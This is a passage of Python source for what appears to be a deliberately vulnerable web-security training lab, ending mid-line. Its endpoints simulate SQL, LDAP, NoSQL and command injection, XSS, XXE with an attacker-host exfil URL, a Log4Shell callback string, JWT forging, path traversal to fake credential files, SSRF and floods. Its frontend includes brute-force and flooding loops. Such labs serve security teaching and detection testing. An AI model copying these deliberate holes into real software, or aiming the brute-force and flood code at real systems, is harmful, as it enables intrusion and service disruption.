  xhr.open('GET','/api/'+endpoint+'?'+qs,true);
    xhr.timeout=8000;
  xhr.onreadystatechange=function(){
    if(xhr.readyState!==4) return;
        renderApiResult(outId,xhr,parseJsonSafe(xhr.responseText));
  };
    xhr.onerror=function(){
        show(outId,'HTTP 0\\nNetwork error: request blocked/reset before app response.');
    };
    xhr.ontimeout=function(){
        show(outId,'HTTP 0\\nRequest timeout: upstream security device may have dropped this request.');
    };
    xhr.onabort=function(){
        show(outId,'HTTP 0\\nRequest aborted before completion.');
    };
  xhr.send();
}

var storedComments=[];
function reflectedXSS(){
  var p=g('rxss-i');
  var xhr=new XMLHttpRequest();
  xhr.open('GET','/api/xss?input='+encodeURIComponent(p),true);
    xhr.timeout=8000;
  xhr.onreadystatechange=function(){
    if(xhr.readyState!==4) return;
        var d=parseJsonSafe(xhr.responseText);
        if(xhr.status===0){
            show('rxss-out','HTTP 0\\nBlocked/reset before app response.');
            return;
        }
        if(!d){
            show('rxss-out','HTTP '+xhr.status+'\\nNon-JSON response, possibly blocked by upstream firewall.');
            return;
        }
        if(d.ok!==true || !d.reflected){
            show('rxss-out','HTTP '+xhr.status+'\\nApp blocked or invalid payload.\\n'+JSON.stringify(d,null,2));
            return;
        }
        showHtml('rxss-out','<span class="warn">Reflected (unsafe innerHTML):</span>\\n'+d.reflected);
  };
    xhr.onerror=function(){ show('rxss-out','HTTP 0\\nNetwork error: request blocked/reset.'); };
    xhr.ontimeout=function(){ show('rxss-out','HTTP 0\\nRequest timeout: likely dropped upstream.'); };
    xhr.onabort=function(){ show('rxss-out','HTTP 0\\nRequest aborted.'); };
  xhr.send();
}
function postComment(){ storedComments.push(g('sxss-i')); show('sxss-out','Stored. Click View Board to render.'); }
function loadComments(){
  var h='<span class="info">Stored (innerHTML):</span>\\n';
  storedComments.forEach(function(c){ h+=c+'\\n'; });
  showHtml('sxss-out',h);
}
function domXSS(){ showHtml('dxss-out','<span class="warn">DOM injection:</span>\\n'+g('dxss-i')); }

function bruteForce(){
  var u=g('bf-u');
  var pws=g('bf-pw').split('\\n').map(function(p){ return p.trim(); }).filter(Boolean);
  var out='Brute forcing "'+u+'" with '+pws.length+' passwords...\\n';
    var done=0,hits=0,blocked=0,errors=0;
    if(!pws.length){ show('bf-out','No passwords provided.'); return; }

    function finishOnce(){
        if(done===pws.length){
            out+='\\nSummary: hits='+hits+', blocked='+blocked+', errors='+errors+', total='+done;
            show('bf-out',out);
        }
    }

  pws.forEach(function(pw){
    var xhr=new XMLHttpRequest();
        var finalized=false;
        function finalize(line,hit){
            if(finalized) return;
            finalized=true;
            if(hit) hits++;
            out+=line+'\\n';
            done++;
            finishOnce();
        }
    xhr.open('GET','/api/sqli?username='+encodeURIComponent(u)+'&password='+encodeURIComponent(pw),true);
        xhr.timeout=6000;
    xhr.onreadystatechange=function(){
      if(xhr.readyState!==4) return;
            var d=parseJsonSafe(xhr.responseText);
            if(xhr.status===0){ blocked++; finalize('[blocked] '+u+':'+pw,false); return; }
            if(!d){ errors++; finalize('[error] '+u+':'+pw+' (non-JSON / intercepted)',false); return; }
            var ok=d.message&&d.message.indexOf('valid')>=0;
            finalize((ok?'[HIT]  ':'[miss] ')+u+':'+pw,ok);
    };
        xhr.onerror=function(){ blocked++; finalize('[blocked] '+u+':'+pw+' (network error)',false); };
        xhr.ontimeout=function(){ blocked++; finalize('[timeout] '+u+':'+pw,false); };
        xhr.onabort=function(){ blocked++; finalize('[aborted] '+u+':'+pw,false); };
    xhr.send();
  });
}

function httpFlood(){
  var ep=g('flood-ep'); var n=parseInt(g('flood-n'),10)||10;
  var out='Sending '+n+' requests to '+ep+'...\\n';
    var done=0,ok=0,httpErr=0,netErr=0,timeouts=0;
  for(var i=0;i<n;i++){
    (function(){
      var xhr=new XMLHttpRequest();
            var finalized=false;
            function finalize(kind){
                if(finalized) return;
                finalized=true;
                if(kind==='ok') ok++;
                else if(kind==='timeout') timeouts++;
                else if(kind==='net') netErr++;
                else httpErr++;
                done++;
                if(done===n){
                    out+='Completed: total='+done+', http200='+ok+', http_error='+httpErr+', network_error='+netErr+', timeout='+timeouts+'\\n';
                    show('flood-out',out);
                }
            }
      xhr.open('GET',ep,true);
            xhr.timeout=6000;
      xhr.onreadystatechange=function(){
        if(xhr.readyState!==4) return;
                if(xhr.status===200) finalize('ok');
                else if(xhr.status===0) finalize('net');
                else finalize('http');
      };
            xhr.onerror=function(){ finalize('net'); };
            xhr.ontimeout=function(){ finalize('timeout'); };
            xhr.onabort=function(){ finalize('net'); };
      xhr.send();
    })();
  }
}

function uploadFile(){
  var input=document.getElementById('upl-f');
  var ext=g('upl-ext');
  if(!input.files||!input.files[0]){ show('upl-out','Select a file first.'); return; }
  var fd=new FormData();
  fd.append('artifact',input.files[0],input.files[0].name+ext);
  var xhr=new XMLHttpRequest();
  xhr.open('POST','/api/upload',true);
    xhr.timeout=12000;
  xhr.onreadystatechange=function(){
    if(xhr.readyState!==4) return;
        renderApiResult('upl-out',xhr,parseJsonSafe(xhr.responseText));
  };
    xhr.onerror=function(){ show('upl-out','HTTP 0\\nNetwork error: upload blocked/reset before app response.'); };
    xhr.ontimeout=function(){ show('upl-out','HTTP 0\\nUpload timeout: request may be blocked or dropped upstream.'); };
    xhr.onabort=function(){ show('upl-out','HTTP 0\\nUpload aborted before completion.'); };
  xhr.send(fd);
}

function loadLogs(){
  var xhr=new XMLHttpRequest();
  xhr.open('GET','/api/logs',true);
  xhr.onreadystatechange=function(){
    if(xhr.readyState!==4) return;
    var d; try{ d=JSON.parse(xhr.responseText); }catch(e){ d={lines:[]}; }
    var b=document.getElementById('log-box');
    if(b) b.textContent=(d.lines||[]).join('\\n')||'No events yet.';
  };
  xhr.send();
}

function listLabFiles(){
  var xhr=new XMLHttpRequest();
  xhr.open('GET','/api/lab-files',true);
  xhr.onreadystatechange=function(){
    if(xhr.readyState!==4) return;
    var d; try{ d=JSON.parse(xhr.responseText); }catch(e){ d={files:[]}; }
    var b=document.getElementById('log-box');
    if(b) b.textContent='Lab Files:\\n'+(d.files||[]).join('\\n');
  };
  xhr.send();
}

function clearLogs(){
  var xhr=new XMLHttpRequest();
  xhr.open('GET','/api/logs/clear',true);
  xhr.onreadystatechange=function(){ if(xhr.readyState===4) loadLogs(); };
  xhr.send();
}
loadLogs();
</script>
</body>
</html>"""


# ---------------------------------------------------------------------------
# HTTP Handler
# ---------------------------------------------------------------------------
class LabHandler(BaseHTTPRequestHandler):

    def _send_json(self, data, code=200):
        b = json.dumps(data).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def _send_html(self, text):
        b = text.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def _route(self):
        p = urlparse(self.path)
        return p.path, parse_qs(p.query)

    def _qp(self, q, key, default=""):
        return unquote_plus(q.get(key, [default])[0])

    # ------------------------------------------------------------------
    def do_GET(self):
        path, query = self._route()

        # --- Root ---------------------------------------------------------
        if path in ("/", "/index.html"):
            self._send_html(HTML_CONTENT)
            return

        # --- Health -------------------------------------------------------
        if path == "/api/health":
            self._send_json({"ok": True})
            return

        # --- Lab file listing ---------------------------------------------
        if path == "/api/lab-files":
            files = []
            for root, _, names in os.walk(LAB_FILES_DIR):
                for n in names:
                    fp = os.path.join(root, n)
                    files.append(os.path.relpath(fp, LAB_FILES_DIR).replace("\\", "/"))
            self._send_json({"ok": True, "files": sorted(files)})
            return

        # --- Logs ---------------------------------------------------------
        if path == "/api/logs":
            self._send_json({"ok": True, "lines": read_last_log_lines(50)})
            return

        if path == "/api/logs/clear":
            if os.path.isfile(LOG_PATH):
                open(LOG_PATH, "w").close()
            self._send_json({"ok": True, "message": "log cleared"})
            return

        # --- SQLi (login bypass) ------------------------------------------
        if path == "/api/sqli":
            u = self._qp(query, "username")
            p = self._qp(query, "password")
            sql = "SELECT * FROM users WHERE username='%s' AND password='%s'" % (u, p)
            combined = (u + " " + p).lower()
            bypassed = ("' or '1'='1" in combined or "--" in combined
                        or " or 1=1" in combined)
            union = "union" in combined and "select" in combined
            valid = any(r["username"] == u and r["password"] == p for r in USERS)
            if bypassed or union:
                msg = "auth bypass triggered"
                append_event("sqli", "bypass", sql)
            elif valid:
                msg = "valid credentials"
                append_event("sqli", "ok", sql)
            else:
                msg = "authentication failed"
                append_event("sqli", "failed", sql)
            self._send_json({"ok": True, "query": sql, "bypassed": bypassed,
                             "union_attempt": union, "message": msg})
            return

        # --- SQLi (search / error-based) ----------------------------------
        if path == "/api/sqli2":
            q = self._qp(query, "q")
            sql = "SELECT * FROM products WHERE name LIKE '%%%s%%'" % q
            error_probe = (q.strip().endswith("'") or "--" in q
                           or "extractvalue" in q.lower())
            if error_probe:
                append_event("sqli_error", "probe", q)
                self._send_json({"ok": False, "query": sql,
                                 "error": "SQL syntax error near '%s'" % q[-20:],
                                 "note": "error-based SQLi pattern detected"})
            else:
                append_event("sqli_search", "ok", q)
                self._send_json({"ok": True, "query": sql,
                                 "results": [{"id": 1, "name": "Widget A"},
                                             {"id": 2, "name": "Widget B"}]})
            return

        # --- NoSQL injection -----------------------------------------------
        if path == "/api/nosqli":
            u = self._qp(query, "username")
            p = self._qp(query, "password")
            bypass = "$gt" in u or "$ne" in u or "$where" in u or "$gt" in p
            if bypass:
                append_event("nosqli", "bypass", "username=%s" % u)
                self._send_json({"ok": True, "bypassed": True,
                                 "message": "NoSQL operator injection: auth short-circuited",
                                 "simulated_query": '{"username":%s,"password":"%s"}' % (u, p)})
            else:
                valid = any(r["username"] == u and r["password"] == p for r in USERS)
                append_event("nosqli", "ok" if valid else "failed", "username=%s" % u)
                self._send_json({"ok": valid, "bypassed": False,
                                 "message": "valid" if valid else "invalid"})
            return

        # --- Command injection -----------------------------------------------
        if path == "/api/cmdi":
            host = self._qp(query, "host")
            cmd  = "ping -c 1 " + host
            dangerous = bool(re.search(r'[;&|$`]', host)) or bool(re.search(r'\s', host.strip()))
            if dangerous:
                append_event("cmdi", "injection", cmd)
                out = ("PING simulated — injection detected.\n"
                       "Constructed: " + cmd + "\n"
                       "Segment 1 (ping): 1 packets transmitted, 1 received\n"
                       "Segment 2 (injected): uid=0(root) gid=0(root) groups=0(root) [simulation]")
            else:
                append_event("cmdi", "safe", cmd)
                out = ("PING %s: 56 data bytes\n"
                       "64 bytes from %s: icmp_seq=0 ttl=64 time=0.1 ms\n"
                       "1 packets transmitted, 1 received, 0%% packet loss" % (host, host))
            self._send_json({"ok": True, "command": cmd, "dangerous": bool(dangerous),
                             "output": out})
            return

        # --- LDAP injection --------------------------------------------------
        if path == "/api/ldapi":
            u = self._qp(query, "username")
            p = self._qp(query, "password")
            filt = "(&(uid=%s)(userPassword=%s))" % (u, p)
            bypass = "*" in u or ")(" in u or "(&" in u
            append_event("ldapi", "bypass" if bypass else "ok", filt)
            self._send_json({"ok": True, "filter": filt, "bypassed": bypass,
                             "message": "LDAP injection — auth bypassed" if bypass
                             else "no injection detected"})
            return

        # --- SSTI ------------------------------------------------------------
        if path == "/api/ssti":
            inp = self._qp(query, "input")
            rce_patterns = ["__class__", "__mro__", "__subclasses__", "popen",
                            "subprocess", "os.system", "eval", "exec"]
            rce = any(pat in inp for pat in rce_patterns)
            result = inp
            m = re.match(r'^\{\{(\d+)\*(\d+)\}\}$', inp.strip())
            if m:
                result = "{{%s*%s}} => %d" % (m.group(1), m.group(2),
                                               int(m.group(1)) * int(m.group(2)))
            append_event("ssti", "rce_attempt" if rce else "rendered", inp)
            self._send_json({"ok": True, "input": inp, "rendered": result,
                             "rce_pattern_detected": rce,
                             "note": "RCE gadget detected" if rce
                             else "arithmetic evaluated safely"})
            return

        # --- CRLF injection --------------------------------------------------
        if path == "/api/crlfi":
            val  = self._qp(query, "value")
            crlf = ("\r\n" in val or "%0d%0a" in val.lower()
                    or "%0a" in val.lower())
            decoded = (val.replace("%0d%0a", "\r\n")
                       .replace("%0a", "\n")
                       .replace("%0d", "\r"))
            injected = [l for l in decoded.split("\n")[1:] if l.strip()] if crlf else []
            append_event("crlfi", "inject" if crlf else "ok", val)
            self._send_json({"ok": True, "value": val, "crlf_detected": crlf,
                             "injected_headers": injected})
            return

        # --- IDOR (user profile) ---------------------------------------------
        if path == "/api/idor":
            try:
                uid = int(self._qp(query, "id", "1"))
            except ValueError:
                uid = 0
            match = next((u for u in USERS if u["id"] == uid), None)
            append_event("idor", "hit" if match else "miss", "id=%d" % uid)
            if match:
                self._send_json({"ok": True,
                                 "user": {"id": match["id"], "username": match["username"],
                                          "role": match["role"],
                                          "email": "%s@lab.internal" % match["username"]},
                                 "note": "IDOR: no ownership check"})
            else:
                self._send_json({"ok": False, "error": "user not found"}, 404)
            return

        # --- JWT tampering ---------------------------------------------------
        if path == "/api/jwt":
            token  = self._qp(query, "token")
            attack = self._qp(query, "attack", "decode")
            parts  = token.split(".")
            result = {}
            pad = lambda s: s + "=" * (4 - len(s) % 4) if len(s) % 4 else s
            if len(parts) >= 2:
                try:
                    result["header"]  = json.loads(base64.b64decode(pad(parts[0])).decode("utf-8","ignore"))
                    result["payload"] = json.loads(base64.b64decode(pad(parts[1])).decode("utf-8","ignore"))
                except Exception:
                    result["decode_error"] = "could not parse JWT"
            if attack == "none_alg":
                fh = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
                fp = base64.b64encode(json.dumps({"user":"admin","role":"administrator"}).encode()).decode().rstrip("=")
                result["attack"] = "alg:none"
                result["forged_token"] = "%s.%s." % (fh, fp)
                result["note"] = "Signature stripped — server accepting alg:none would treat this as valid"
                append_event("jwt", "alg_none", token[:40])
            elif attack == "weak_secret":
                found = None
                if len(parts) == 3:
                    for s in JWT_WEAK_SECRETS:
                        msg = (parts[0]+"."+parts[1]).encode()
                        expected = base64.urlsafe_b64encode(
                            _hmac.new(s.encode(), msg, hashlib.sha256).digest()
                        ).rstrip(b"=").decode()
                        if expected == parts[2]:
                            found = s
                            break
                result["attack"] = "weak_secret"
                result["cracked_secret"] = found
                result["note"] = ("Secret found: "+found) if found else "No common secret matched"
                append_event("jwt", "weak_secret", str(found))
            else:
                result["attack"] = "decode_only"
                append_event("jwt", "decode", token[:40])
            self._send_json({"ok": True, "result": result})
            return

        # --- Privilege escalation -------------------------------------------
        if path == "/api/privesc":
            role    = self._qp(query, "role", "viewer")
            granted = role == "administrator"
            append_event("privesc", "escalated" if granted else "ok", "role=%s" % role)
            self._send_json({"ok": True, "claimed_role": role,
                             "access_granted": granted,
                             "admin_data": {"flag": "ADMIN_ACCESS_GRANTED",
                                            "users": USERS} if granted else None,
                             "note": "No server-side role check" if granted else "Insufficient role"})
            return

        # --- Weak cryptography -----------------------------------------------
        if path == "/api/weakcrypto":
            pw  = self._qp(query, "password")
            alg = self._qp(query, "alg", "md5")
            if alg == "md5":
                h = hashlib.md5(pw.encode()).hexdigest()
                note = "MD5 is broken — rainbow tables can crack instantly"
            elif alg == "sha1":
                h = hashlib.sha1(pw.encode()).hexdigest()
                note = "SHA-1 deprecated — collision attacks demonstrated"
            elif alg == "sha256":
                h = hashlib.sha256(pw.encode()).hexdigest()
                note = "SHA-256 without salt is still vulnerable to rainbow tables"
            else:
                h = "$2b$12$FakeLabBcryptHashSaltAndHashSimulated"
                note = "bcrypt (simulated) — proper adaptive hash with cost factor"
            append_event("weakcrypto", alg, "len=%d" % len(pw))
            self._send_json({"ok": True, "algorithm": alg, "hash": h, "note": note})
            return

        # --- Log forging -----------------------------------------------------
        if path == "/api/logforge":
            raw     = self._qp(query, "msg")
            decoded = (raw.replace("%0a", "\n")
                       .replace("%0d%0a", "\n")
                       .replace("%0d", "\n"))
            lines = decoded.split("\n")
            for line in lines:
                append_event("logforge_injected", "warn", line)
            self._send_json({"ok": True, "lines_injected": len(lines),
                             "note": "Forged log lines written — check Event Logs tab"})
            return

        # --- XSS (reflected) -------------------------------------------------
        if path == "/api/xss":
            payload = self._qp(query, "input")
            append_event("xss", "reflected", payload[:120])
            self._send_json({"ok": True, "reflected": "You searched for: " + payload})
            return

        # --- XSS via header --------------------------------------------------
        if path == "/api/headerxss":
            val    = self._qp(query, "value")
            custom = self.headers.get("X-Custom-Name", val)
            append_event("xss_header", "reflected", custom[:120])
            self._send_json({"ok": True, "header_value": custom,
                             "reflected": "Hello, " + custom,
                             "note": "Header reflected without escaping"})
            return

        # --- LFI / path traversal -------------------------------------------
        if path == "/api/lfi":
            target = self._qp(query, "target").strip()
            if not target:
                self._send_json({"ok": False, "error": "missing target"}, 400)
                return
            lower = target.replace("\\", "/").replace("%2f","/").replace("%252f","/").lower()
            resolved = None
            if "shadow" in lower:     resolved = "etc/shadow"
            elif "passwd" in lower:   resolved = "etc/passwd"
            elif "id_rsa" in lower:   resolved = "keys/id_rsa"
            elif "tokens.json" in lower: resolved = "app/tokens.json"
            elif "config.yaml" in lower: resolved = "app/config.yaml"
            elif ".env" in lower:     resolved = "app/.env"
            if not resolved:
                append_event("lfi", "miss", target)
                self._send_json({"ok": False, "error": "file not in lab dataset",
                                 "request_target": target}, 404)
                return
            fp = os.path.join(LAB_FILES_DIR, resolved)
            with open(fp, "r") as fh:
                content = fh.read()
            append_event("lfi", "hit", "target=%s resolved=%s" % (target, resolved))
            self._send_json({"ok": True, "request_target": target,
                             "resolved_file": resolved,
                             "vulnerable_path_behavior": True,
                             "content": content})
            return

        # --- Directory listing -----------------------------------------------
        if path == "/api/dirlist":
            p = self._qp(query, "path", "/")
            mapped = {
                "/":          ["index.html", "lab_files/", "uploads/", "lab_events.log"],
                "/lab_files": list(XXE_FILES.keys()),
                "/uploads":   (os.listdir(UPLOADS_DIR)
                               if os.path.isdir(UPLOADS_DIR) else []),
            }
            entries = mapped.get(p, [])
            append_event("dirlist", "exposed" if entries else "miss", p)
            self._send_json({"ok": True, "path": p, "entries": entries,
                             "note": "Directory listing enabled — A05 misconfiguration"})
            return

        # --- Dot-file / backup -----------------------------------------------
        if path == "/api/dotfile":
            f = self._qp(query, "file", ".env")
            if ".env" in f or "env" in f.lower():
                fp = os.path.join(LAB_FILES_DIR, "app/.env")
                try:
                    with open(fp, "r") as fh:
                        content = fh.read()
                    append_event("dotfile", "exposed", f)
                    self._send_json({"ok": True, "file": f, "content": content})
                except IOError:
                    self._send_json({"ok": False, "error": "unavailable"}, 404)
            else:
                content = "# Simulated backup file\npassword=LabBackupPass999\nsecret=backup-secret-fake"
                append_event("dotfile", "exposed", f)
                self._send_json({"ok": True, "file": f, "content": content,
                                 "note": "Backup file exposed"})
            return

        # --- SSRF ------------------------------------------------------------
        if path == "/api/ssrf":
            url  = self._qp(query, "url")
            host = url.split("/")[0].split("@")[-1].split(":")[0]
            resp = SSRF_TARGETS.get(host, "Connection refused (simulated)")
            append_event("ssrf", "hit" if host in SSRF_TARGETS else "miss", url)
            self._send_json({"ok": True, "requested_url": url, "host": host,
                             "hit": host in SSRF_TARGETS, "response": resp})
            return

        # --- SSRF via redirect -----------------------------------------------
        if path == "/api/ssrf_redirect":
            url      = self._qp(query, "url")
            bypasses = ["0x7f", "127.1", "[::1]", "localhost", "127.0.0.1", "0.0.0.0"]
            bypassed = any(bp in url for bp in bypasses)
            append_event("ssrf_redirect", "bypass" if bypassed else "blocked", url)
            self._send_json({"ok": True, "url": url, "bypassed": bypassed,
                             "response": SSRF_TARGETS.get("127.0.0.1") if bypassed
                             else "redirect blocked by allowlist",
                             "note": "IP bypass detected" if bypassed
                             else "URL checked against allowlist"})
            return

        # --- XXE (file read) -------------------------------------------------
        if path == "/api/xxe":
            xml = self._qp(query, "xml")
            key_map = {"passwd": "passwd", "shadow": "shadow",
                       "env": "env", "id_rsa": "id_rsa"}
            entity_target = None
            m = re.search(r'SYSTEM\s+"([^"]+)"', xml)
            if m:
                raw = m.group(1).split("/")[-1]
                entity_target = key_map.get(raw)
            content = XXE_FILES.get(entity_target, "") if entity_target else ""
            append_event("xxe", "hit" if content else "miss", xml[:80])
            self._send_json({"ok": True, "entity_resolved": entity_target,
                             "content": content or "entity not in lab dataset",
                             "vulnerable": bool(content),
                             "note": "DOCTYPE not sanitized — XXE possible"})
            return

        # --- XXE blind OOB ---------------------------------------------------
        if path == "/api/xxe_blind":
            cb_host  = self._qp(query, "host")
            file_key = self._qp(query, "file", "passwd")
            content  = XXE_FILES.get(file_key, "")
            exfil_b64 = base64.b64encode(content.encode()).decode()
            exfil_url = "http://%s/?data=%s..." % (cb_host, exfil_b64[:60])
            append_event("xxe_oob", "exfil", "host=%s file=%s" % (cb_host, file_key))
            self._send_json({"ok": True, "attack": "blind_xxe_oob",
                             "dtd_fetched": "http://%s/evil.dtd" % cb_host,
                             "exfil_url_simulated": exfil_url,
                             "exfiltrated_preview": content[:120] + "...",
                             "note": "OOB simulated — no real network request made"})
            return

        # --- Insecure deserialization ----------------------------------------
        if path == "/api/deser":
            data   = self._qp(query, "data")
            fmt    = self._qp(query, "format", "json")
            gadget = any(g in data for g in DESER_GADGETS)
            result = {}
            try:
                decoded = base64.b64decode(data + "==").decode("utf-8", "ignore")
                if fmt == "json":
                    result = json.loads(decoded)
            except Exception:
                result = {"raw": data[:80]}
            append_event("deser", "gadget" if gadget else "ok",
                         "format=%s gadget=%s" % (fmt, gadget))
            self._send_json({"ok": True, "format": fmt, "deserialized": result,
                             "gadget_chain_detected": gadget,
                             "note": "Gadget chain detected — RCE possible in real deserializer"
                             if gadget else "No obvious gadget"})
            return

        # --- Log4Shell -------------------------------------------------------
        if path == "/api/log4shell":
            inp     = self._qp(query, "input")
            is_jndi = bool(re.search(r'\$\{jndi:', inp, re.IGNORECASE))
            obfusc  = "lower:" in inp or "upper:" in inp or "${::-j}" in inp
            append_event("log4shell", "jndi" if is_jndi else "ok", inp[:120])
            self._send_json({"ok": True, "input": inp,
                             "jndi_triggered": is_jndi,
                             "obfuscation": obfusc,
                             "simulated_callback": "ldap://attacker.example.com/a -> RMI class loaded"
                             if is_jndi else None,
                             "note": "CVE-2021-44228 simulation — no real JNDI call"})
            return

        # --- Debug endpoint --------------------------------------------------
        if path == "/api/debugpath":
            p = self._qp(query, "path", "/debug")
            exposed = {
                "/debug":        {"debug": True, "env": {"DB_PASS": "LabOnlyPassword123"}, "heap_mb": 128},
                "/_debug":       {"debug": True, "threads": 4},
                "/console":      {"console": "enabled", "note": "Groovy console accessible"},
                "/actuator/env": {"activeProfiles": ["dev"],
                                  "propertySources": [{"name": "applicationConfig",
                                                        "properties": {"db.password": {"value": "LabOnlyPassword123"}}}]},
            }
            data = exposed.get(p)
            append_event("debugpath", "exposed" if data else "miss", p)
            self._send_json({"ok": bool(data), "path": p,
                             "exposed": data,
                             "note": "Debug endpoint exposed — A05 misconfiguration" if data
                             else "path not a known debug path"})
            return

        # --- Default credentials --------------------------------------------
        if path == "/api/defcred":
            u = self._qp(query, "username")
            p = self._qp(query, "password")
            weak = [("admin","admin"),("admin","password"),("root","root"),
                    ("admin","1234"),("guest","guest"),("admin","")]
            hit   = (u, p) in weak
            exact = any(r["username"] == u and r["password"] == p for r in USERS)
            append_event("defcred", "hit" if (hit or exact) else "fail",
                         "u=%s" % u)
            self._send_json({"ok": True, "default_cred_match": hit,
                             "valid_lab_cred": exact,
                             "access": hit or exact,
                             "note": "Weak default credential" if hit else "No default match"})
            return

        # --- Method tampering ------------------------------------------------
        if path == "/api/method_tamper":
            method      = self._qp(query, "method", "TRACE").upper()
            target_path = self._qp(query, "path", "/api/health")
            dangerous   = method in ("TRACE","CONNECT","DELETE","PUT","PATCH")
            append_event("method_tamper", "dangerous" if dangerous else "ok",
                         "method=%s path=%s" % (method, target_path))
            self._send_json({"ok": True, "method": method, "path": target_path,
                             "dangerous": dangerous,
                             "note": "%s should be blocked" % method if dangerous
                             else "Method acceptable"})
            return

        # --- File IDOR -------------------------------------------------------
        if path == "/api/file_idor":
            rid       = self._qp(query, "id", "1")
            traversal = ".." in rid or "/" in rid
            reports   = {
                "1": "Q1 Sales Report: revenue=$1.2M",
                "2": "HR Confidential: employees=47, avg_salary=85000",
                "3": "Pentest Findings: critical=3 high=12",
            }
            content = reports.get(rid)
            if traversal:
                append_event("file_idor", "traversal", rid)
                self._send_json({"ok": False, "error": "traversal detected",
                                 "note": "Path traversal via report ID"})
            elif content:
                append_event("file_idor", "hit", "id=%s" % rid)
                self._send_json({"ok": True, "report_id": rid, "content": content,
                                 "note": "IDOR — no ownership check"})
            else:
                self._send_json({"ok": False, "error": "report not found"}, 404)
            return

        # --- Verbose error ---------------------------------------------------
        if path == "/api/verbose_error":
            inp = self._qp(query, "input")
            append_event("verbose_error", "triggered", inp[:80])
            self._send_json({"ok": False,
                             "exception": "TemplateRenderError",
                             "traceback": (
                                 "Traceback (most recent call last):\n"
                                 "  File \"/app/render.py\", line 42, in render_template\n"
                                 "    return env.from_string(template).render(ctx)\n"
                                 "jinja2.exceptions.UndefinedError: '%s' is undefined" % inp
                             ),
                             "server": "LabApp/1.0 Python/3.6.8",
                             "note": "Full traceback exposed — information disclosure A05"})
            return

        # --- IP spoofing -----------------------------------------------------
        if path == "/api/ip_spoof":
            spoofed  = self._qp(query, "ip")
            endpoint = self._qp(query, "endpoint", "/api/health")
            xff      = self.headers.get("X-Forwarded-For", spoofed)
            trusted  = (spoofed.startswith("10.") or spoofed.startswith("192.168.")
                        or spoofed == "127.0.0.1")
            append_event("ip_spoof", "trusted" if trusted else "rejected",
                         "xff=%s ep=%s" % (xff, endpoint))
            self._send_json({"ok": True, "x_forwarded_for": xff,
                             "real_client": self.client_address[0],
                             "trusted_bypass": trusted,
                             "note": "X-Forwarded-For trusted without validation"
                             if trusted else "IP not in trusted range"})
            return

        # --- Port scan -------------------------------------------------------
        if path == "/api/portscan":
            target    = self._qp(query, "host", "127.0.0.1")
            ports_raw = self._qp(query, "ports", "22,80,443,3306")
            ports = []
            for tok in ports_raw.split(","):
                tok = tok.strip()
                if tok.isdigit():
                    ports.append(int(tok))
            simulated_open = {22, 80, 443, 3306, 6379}
            service_map    = {22:"ssh",80:"http",443:"https",3306:"mysql",
                              6379:"redis",8080:"http-alt",8443:"https-alt"}
            results = [{"port": po,
                        "state": "open" if po in simulated_open else "closed",
                        "service": service_map.get(po, "unknown")}
                       for po in ports]
            append_event("portscan", "scan", "host=%s ports=%s" % (target, ports_raw))
            self._send_json({"ok": True, "target": target, "results": results,
                             "note": "Simulated scan — no real TCP connections"})
            return

        # --- SYN flood -------------------------------------------------------
        if path == "/api/synflood":
            h    = self._qp(query, "host", "127.0.0.1")
            port = self._qp(query, "port", "80")
            cnt  = self._qp(query, "count", "100")
            append_event("synflood", "simulated",
                         "host=%s port=%s count=%s" % (h, port, cnt))
            self._send_json({"ok": True, "attack": "syn_flood_simulation",
                             "target": "%s:%s" % (h, port),
                             "simulated_packets": cnt,
                             "note": "No real packets sent — log generated for WAF/IDS"})
            return

        # --- Slowloris -------------------------------------------------------
        if path == "/api/slowloris":
            conns = self._qp(query, "connections", "50")
            append_event("slowloris", "simulated", "connections=%s" % conns)
            self._send_json({"ok": True, "attack": "slowloris_simulation",
                             "simulated_connections": conns,
                             "note": "No real sockets opened — log entry generated"})
            return

        # --- Host header injection -------------------------------------------
        if path == "/api/hostheader":
            h_val    = self._qp(query, "host")
            ep       = self._qp(query, "endpoint", "/api/health")
            real     = self.headers.get("Host", "")
            poisoned = h_val not in ("localhost", "127.0.0.1", "0.0.0.0")
            link     = "https://%s/reset?token=lab-fake-token-abc123" % h_val
            append_event("hostheader", "poisoned" if poisoned else "ok",
                         "host=%s ep=%s" % (h_val, ep))
            self._send_json({"ok": True, "injected_host": h_val, "real_host": real,
                             "poisoned": poisoned,
                             "poisoned_reset_link": link if poisoned else None,
                             "note": "Host header used in reset link — cache poisoning risk"
                             if poisoned else "Host is local"})
            return

        # --- Polyglot upload -------------------------------------------------
        if path == "/api/polyglot":
            fn  = self._qp(query, "filename")
            ct  = self._qp(query, "ct", "image/jpeg")
            pl  = self._qp(query, "payload")
            risky_ext = any(ext in fn.lower()
                            for ext in [".php",".jsp",".aspx",".phtml",".php5"])
            script_sig = "<?php" in pl or "<%" in pl
            append_event("polyglot_upload", "risky" if (risky_ext or script_sig) else "ok",
                         "fn=%s ct=%s" % (fn, ct))
            self._send_json({"ok": True, "filename": fn, "content_type": ct,
                             "risky_extension": risky_ext,
                             "script_signature": script_sig,
                             "note": "Polyglot accepted — content-type mismatch not rejected"
                             if (risky_ext or script_sig) else "File appears benign"})
            return

        self.send_error(404, "Not Found")

    # ------------------------------------------------------------------
    def do_POST(self):
        path, _ = self._route()
        if path != "/api/upload":
            self.send_error(404, "Not Found")
            return

        ct = self.headers.get("Content-Type", "")
        if "multipart/form-data" not in ct:
            self._send_json({"ok": False, "error": "multipart/form-data required"}, 400)
            return

        try:
            cl = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            cl = 0

        if cl <= 0 or cl > MAX_UPLOAD_SIZE:
            self._send_json({"ok": False, "error": "invalid size"}, 400)
            return

        body         = self.rfile.read(cl)
        fname, data  = parse_multipart_artifact(body, ct)
        if not fname or data is None:
            self._send_json({"ok": False, "error": "missing artifact field"}, 400)
            return

        stored = datetime.utcnow().strftime("%Y%m%d%H%M%S") + "_" + fname
        spath  = os.path.join(UPLOADS_DIR, stored)
        with open(spath, "wb") as fh:
            fh.write(data)

        sha256    = hashlib.sha256(data).hexdigest()
        text      = data.decode("utf-8", "ignore")
        eicar     = EICAR_TEXT in text
        script_hd = any(text.strip().startswith(m) for m in ["<?php","<%@","<%","<script"])
        risky_ext = os.path.splitext(fname)[1].lower() in (
